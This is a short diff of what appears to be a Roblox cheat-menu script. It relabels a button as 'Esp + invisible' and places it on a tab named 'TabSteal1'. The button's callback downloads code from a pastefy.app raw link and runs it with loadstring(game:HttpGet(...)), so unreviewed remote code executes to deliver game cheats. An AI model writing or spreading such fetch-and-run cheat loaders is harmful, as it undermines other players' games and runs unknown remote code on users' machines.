@@ -1124,9 +1124,9 @@ local Button = TabSteal1:Button({
         print("clicked")
     end
 })
-local ButtonSteal1 = Tab:Button({
-    Title = "Button",
-    Desc = "Test Button",
+local ButtonSteal1 = TabSteal1:Button({
+    Title = "1",
+    Desc = "Esp + invisible",
     Locked = false,
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/NU4lqGZe/raw"))()
